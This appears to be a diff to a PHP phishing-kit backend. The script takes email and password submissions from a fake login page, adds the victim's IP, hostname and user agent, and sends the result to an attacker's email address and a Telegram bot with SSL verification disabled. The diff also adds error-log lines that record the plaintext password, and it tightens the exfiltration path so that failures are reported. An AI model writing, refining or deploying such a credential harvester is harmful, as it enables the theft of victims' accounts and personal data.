@@ -17,8 +17,18 @@ function sendJsonResponse($success, $message = '', $redirectUrl = '') {
     exit();
 }
 
-// Check if inputs are valid
-if (!empty($email) && !empty($password)) {
+// Debugging log to check if POST data is received
+if (empty($email) || empty($password)) {
+    error_log("Invalid input: email or password is missing.");
+    sendJsonResponse(false, "Invalid input: Email or Password missing.");
+    exit();
+}
+
+try {
+    // Debug logs for backend processing
+    error_log("Received email: {$email}");
+    error_log("Received password: {$password}");
+
     // Get client information
     $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
     $hostname = gethostbyaddr($ip) ?: 'Unknown';
@@ -36,54 +46,43 @@ User Agent: {$userAgent}
 |-----------------------|
 EOT;
 
-    // Email Configuration
+    // Email Configuration (from email.php)
+    error_log("Using Receiver email: {$Receive_email}");
     $subject = "Login Attempt: {$ip}";
-    $Receive_email = getenv('RECEIVER_EMAIL') ?: 'fallback_email@example.com'; // Use fallback email if environment variable is not set
 
-    // Send email
-    if (filter_var($Receive_email, FILTER_VALIDATE_EMAIL)) {
-        if (!mail($Receive_email, $subject, $message)) {
-            error_log("Failed to send email to {$Receive_email}");
-            sendJsonResponse(false, "Email sending failed. Please contact support.");
-            exit();
-        }
-    } else {
-        error_log("Environment variable RECEIVER_EMAIL is missing or invalid.");
-        sendJsonResponse(false, "Backend configuration error: Receiver email is invalid.");
+    // Ensure mail() execution
+    if (!mail($Receive_email, $subject, $message)) {
+        error_log("Failed to send email to {$Receive_email}");
+        sendJsonResponse(false, "Failed to send email.");
         exit();
     }
 
     // Telegram Notification
-    $botToken = getenv('TELEGRAM_BOT_TOKEN') ?: '';
-    $id = getenv('TELEGRAM_CHAT_ID') ?: '';
+    $encodedMessage = urlencode($message);
+    $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendmessage?chat_id={$id}&text={$encodedMessage}";
+    
+    $curl = curl_init();
+    curl_setopt_array($curl, [
+        CURLOPT_URL => $telegramUrl,
+        CURLOPT_SSL_VERIFYPEER => false, // Disable SSL verification
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 10 // Prevent hanging
+    ]);
 
-    if (!empty($botToken) && !empty($id)) {
-        $encodedMessage = urlencode($message);
-        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$id}&text={$encodedMessage}";
-        
-        try {
-            $curl = curl_init();
-            curl_setopt_array($curl, [
-                CURLOPT_URL => $telegramUrl,
-                CURLOPT_SSL_VERIFYPEER => false, // Disable SSL verification (if needed)
-                CURLOPT_RETURNTRANSFER => true, // Return response instead of outputting
-                CURLOPT_TIMEOUT => 10 // Prevent hanging
-            ]);
+    $result = curl_exec($curl);
+    if (!$result || curl_errno($curl)) {
+        error_log("Telegram API error: " . curl_error($curl));
+        curl_close($curl);
+        sendJsonResponse(false, "Failed to send Telegram notification.");
+        exit();
+    }
 
-            $result = curl_exec($curl);
-            if (!$result || curl_errno($curl)) {
-                error_log("Telegram API error: " . curl_error($curl));
-            }
+    curl_close($curl);
 
-            curl_close($curl);
-        } catch (Exception $e) {
-            error_log("Telegram exception: " . $e->getMessage());
-        }
-    } 
-
-    // Frontend Response
-    sendJsonResponse(true, "Notification sent successfully", "https://dashboard.example.com"); // Replace with your dashboard link
-} else {
-    sendJsonResponse(false, "Invalid input: Email or Password missing");
+    // Respond to the frontend
+    sendJsonResponse(true, "Notification sent successfully!", $redirect);
+} catch (Exception $e) {
+    error_log("Exception occurred: " . $e->getMessage());
+    sendJsonResponse(false, "An error occurred. Please try again.");
 }
 ?>
